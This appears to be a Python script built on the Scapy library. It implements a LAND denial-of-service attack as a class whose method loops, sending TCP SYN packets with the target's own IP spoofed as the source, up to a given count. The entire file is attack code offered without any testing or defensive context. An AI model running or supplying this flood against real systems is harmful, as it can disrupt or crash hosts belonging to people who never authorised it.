from scapy.layers.inet import *
from scapy.all import *

host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)


class LandAttack:
    def __init__(self, dst_ip, dst_port):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.sending = True
        self.cta_count = 0
        self.data = "LAND ATTACK !!!"

    def land_attack(self, count):
        while self.sending:
            L3 = IP(src=self.dst_ip, dst=self.dst_ip)
            L4 = TCP(flags='S', sport=self.dst_port)
            L5 = Raw(load=self.data)
            pkt = L3 / L4 / L5
            send(pkt)
            self.cta_count += 1
            print("Sent packet count: " + str(self.cta_count))
            if self.cta_count == count:
                break